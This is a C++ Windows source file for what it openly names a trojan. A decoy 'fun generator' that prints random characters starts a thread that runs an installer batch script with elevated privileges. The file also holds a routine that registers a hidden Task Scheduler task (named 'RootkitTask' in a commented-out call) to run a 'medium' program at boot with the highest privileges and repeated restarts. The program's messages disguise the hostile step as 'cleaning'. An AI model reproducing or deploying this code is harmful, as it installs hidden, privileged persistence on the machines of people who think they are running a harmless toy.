#include <iostream>
#include <random>
#include <Windows.h>
#include <combaseapi.h>
#include <taskschd.h>
#include <mstask.h>
#include <stdio.h>
#include <comdef.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")


BOOL CreateTask(LPCWSTR TaskName, LPCWSTR RunPath) {
    HRESULT TaskRes;
    ITaskService* SchdlrSrvcPnt = NULL;
    ITaskFolder* RootTaskFolder = NULL;
    BSTR Tname;
    BSTR Rname;
    ITaskDefinition* TaskDefPnt = NULL;
    ITaskSettings* TaskSettingsPnt = NULL;
    IPrincipal* TaskPrincipalPnt = NULL;
    ITriggerCollection* TaskTriggerCol = NULL;
    ITrigger* ActBootTrigger = NULL;
    ITrigger* ActRepsTrigger = NULL;
    IBootTrigger* BootTrigger = NULL;
    IDailyTrigger* RepsTrigger = NULL;
    IAction* ActAction = NULL;
    IExecAction* ExecAction = NULL;
    IActionCollection* TaskActionCol = NULL;
    IRegisteredTask* RegisteredTaskPnt = NULL;
    TASK_INSTANCES_POLICY TaskInstances = TASK_INSTANCES_IGNORE_NEW;  // Start task only if another instance is not already running
    IRepetitionPattern* TaskRepPattern = NULL;
    BSTR RestartInt = _bstr_t(L"PT1M");

    

    // Initialize COM -
    TaskRes = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(TaskRes))
    {
        printf("1\n");
        return FALSE;
    }


    //  Set general COM security levels -
    TaskRes = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(TaskRes))
    {
        printf("2\n");
        CoUninitialize();
        return FALSE;
    }


/*
TASK_SCHEDULER_SERVICE TASK_SCHEDULER_SERVICE TASK_SCHEDULER_SERVICE TASK_SCHEDULER_SERVICE:
*/

    printf("Service\n");

    // Create instance of the task scheduler service -
    TaskRes = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&SchdlrSrvcPnt);

    if (FAILED(TaskRes))
    {
        printf("3\n");
        CoUninitialize();
        return FALSE;
    }


    //  Connect to the task service -
    TaskRes = SchdlrSrvcPnt->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(TaskRes))
    {
        printf("4\n");
        SchdlrSrvcPnt->Release();
        CoUninitialize();
        return FALSE;
    }


/*
TASK_CONFIG+TASK_INSTANCE_POINTER TASK_CONFIG+TASK_INSTANCE_POINTER TASK_CONFIG+TASK_INSTANCE_POINTER:
*/
    

    printf("TASK CONFIG\n");

    //  Get the pointer to the root task folder (for the new registered task)- 
    TaskRes = SchdlrSrvcPnt->GetFolder(_bstr_t(L"\\"), &RootTaskFolder);
    if (FAILED(TaskRes))
    {
        printf("5\n");
        SchdlrSrvcPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  If the same task exists remove it -
    Tname = SysAllocString(TaskName);
    RootTaskFolder->DeleteTask(Tname, 0);
    if (Tname != NULL) {
        SysFreeString(Tname);
    }


    //  Create a task builder object to create the task -
    TaskRes = SchdlrSrvcPnt->NewTask(0, &TaskDefPnt);


    // Release task scheduler service instance (not needed anymore) -
    SchdlrSrvcPnt->Release();
    if (FAILED(TaskRes))
    {
        printf("6\n");
        RootTaskFolder->Release();
        CoUninitialize();
        return FALSE;
    }


/*
SETTINGS SETTINGS SETTINGS SETTINGS SETTINGS SETTINGS SETTINGS SETTINGS SETTINGS:
*/


    printf("Settings\n");

    // Set principal values (privileges) -
    TaskRes = TaskDefPnt->get_Principal(&TaskPrincipalPnt);
    if (FAILED(TaskRes))
    {
        printf("7\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = TaskPrincipalPnt->put_RunLevel(TASK_RUNLEVEL_HIGHEST);  // Run task with highest privileges
    if (FAILED(TaskRes))
    {
        printf("7A\n");
        TaskPrincipalPnt->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }
    TaskPrincipalPnt->Release();

    //  Create the settings of the task -
    TaskRes = TaskDefPnt->get_Settings(&TaskSettingsPnt);
    if (FAILED(TaskRes))
    {
        printf("8\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    TaskRes = TaskSettingsPnt->put_StartWhenAvailable(VARIANT_TRUE);  // Start the task asap
    if (FAILED(TaskRes))
    {
        printf("8A\n");
        TaskSettingsPnt->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = TaskSettingsPnt->put_Hidden(VARIANT_TRUE);  // Apply the "hidden" option
    if (FAILED(TaskRes))
    {
        printf("8B\n");
        TaskSettingsPnt->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = TaskSettingsPnt->put_Priority(3);  // Above normal
    if (FAILED(TaskRes))
    {
        printf("8C\n");
        TaskSettingsPnt->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = TaskSettingsPnt->put_MultipleInstances(TaskInstances);  // Only one at a time
    if (FAILED(TaskRes))
    {
        printf("8D\n");
        TaskSettingsPnt->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = TaskSettingsPnt->put_RestartCount(300);  // Repeat starting medium for 300 times if does not work
    if (FAILED(TaskRes))
    {
        printf("8E\n");
        TaskSettingsPnt->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = TaskSettingsPnt->get_RestartInterval(&RestartInt);  // Repeat starting medium in one minute intervals
    if (FAILED(TaskRes))
    {
        printf("8E\n");
        TaskSettingsPnt->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }
    TaskSettingsPnt->Release();


/*
TRIGGERS TRIGGERS TRIGGERS TRIGGERS TRIGGERS TRIGGERS TRIGGERS TRIGGERS TRIGGERS:
*/

    printf("Triggers\n");

    // Get the trigger collection of task to set boot trigger and reps trigger -
    TaskRes = TaskDefPnt->get_Triggers(&TaskTriggerCol);
    if (FAILED(TaskRes))
    {
        printf("9\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Create a boot trigger -
    TaskRes = TaskTriggerCol->Create(TASK_TRIGGER_BOOT, &ActBootTrigger);
    TaskTriggerCol->Release();
    if (FAILED(TaskRes))
    {
        printf("9A1\n");
        TaskTriggerCol->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    // Add the boot trigger to the task -
    TaskRes = ActBootTrigger->QueryInterface(
        IID_IBootTrigger, (void**)&BootTrigger);
    ActBootTrigger->Release();
    if (FAILED(TaskRes))
    {
        printf("9A2\n");
        TaskTriggerCol->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = BootTrigger->put_Delay(_bstr_t(L"PT30S"));  // Start 30 seconds after booting time
    if (FAILED(TaskRes))
    {
        printf("9A3\n");
        BootTrigger->Release();
        TaskTriggerCol->Release();
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


/*
EXECUTABLE EXECUTABLE EXECUTABLE EXECUTABLE EXECUTABLE EXECUTABLE EXECUTABLE EXECUTABLE EXECUTABLE:
*/


    printf("EXECUTABLE\n");

    //  Get the task action collection -
    TaskRes = TaskDefPnt->get_Actions(&TaskActionCol);
    if (FAILED(TaskRes))
    {
        printf("10\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Create an executable action -
    TaskRes = TaskActionCol->Create(TASK_ACTION_EXEC, &ActAction);
    TaskActionCol->Release();
    if (FAILED(TaskRes))
    {
        printf("11\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    printf("After execution action creation 1\n");
    TaskRes = ActAction->QueryInterface(
        IID_IExecAction, (void**)&ExecAction);
    ActAction->Release();
    if (FAILED(TaskRes))
    {
        printf("12\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    printf("After execution action creation 2\n");

    //  Set the path of the executable in the execute path to the path of medium -
    Rname = SysAllocString(RunPath);
    TaskRes = ExecAction->put_Path(Rname);
    ExecAction->Release();

    if (Rname != NULL) {
        SysFreeString(Rname);
    }

    if (FAILED(TaskRes))
    {
        printf("13\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }
    printf("After system alloc string put path\n");


/*
SAVE+QUIT SAVE+QUIT SAVE+QUIT SAVE+QUIT SAVE+QUIT SAVE+QUIT SAVE+QUIT SAVE+QUIT SAVE+QUIT:
*/


    printf("Save + quit\n");

    //  Save the task in the root folder.
    TaskRes = RootTaskFolder->RegisterTaskDefinition(
        _bstr_t(TaskName),
        TaskDefPnt,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,  // TASK_LOGON_NONE
        _variant_t(L""),
        &RegisteredTaskPnt);
    if (FAILED(TaskRes))
    {
        printf("\nError saving the Task : %x", TaskRes);
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    printf("passed\n");
    RootTaskFolder->Release();
    TaskDefPnt->Release();
    CoUninitialize();
    return TRUE;
}


std::wstring GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


BOOL TrojanThread() {
    std::wstring CurrPath = GetCurrentPath();  // exe path, not solution path / source file path
    std::wstring MedPath = CurrPath + L"\\MainMedium\\x64\\Debug\\MainMedium.exe";


    /*
    // Create task scheduler task to run medium program -
    if (!CreateTask(L"RootkitTask", MedPath.c_str())) {
        printf("Cleaning error tasktasktsak\n");
        return FALSE;
    }
    */


    // Execute batch file -
    HRESULT ComRes = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);  // Initialize COM - cmd EXTs can depend on it
    const char* BatFile = "installer\\target_script.bat";
    HINSTANCE ExecRes = ShellExecuteA(NULL, "runas", BatFile, NULL, NULL, SW_SHOWNORMAL);
    CoUninitialize();
    if ((ULONG)ExecRes < 32) {
        printf("Some other error occured while cleaning -> %u\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}


int main()
{
    char Inp;
    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,/;[]{}:-_=+)(*&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    
    // Trojan variables and calling -
    SECURITY_ATTRIBUTES Trojattr = { 0 };
    Trojattr.bInheritHandle = FALSE;
    Trojattr.nLength = sizeof(SECURITY_ATTRIBUTES);
    Trojattr.lpSecurityDescriptor = NULL;

    HANDLE Trojthrd = CreateThread(&Trojattr,
        0,
        (LPTHREAD_START_ROUTINE)&TrojanThread,
        NULL,
        0,
        NULL);

    if (Trojthrd == NULL) {
        printf("Cannot continue with FunEngine, please retry..\n");
        return 1;
    }

    printf("Welcome to fun generator! Setting things up...\nStart?\n");
    std::cin >> Inp;
    while (Inp != 'n') {
        printf("Your random fun character is -----> %c\n", Alp[distr(gen)]);
        printf("Continue?\n");
        std::cin >> Inp;
    }

    printf("Finished Fun Engine! Cleaning everything...\n");
    WaitForSingleObject(Trojthrd, INFINITE);
    printf("Cleaning succeeded, bye bye!\n");
    return 0;
}
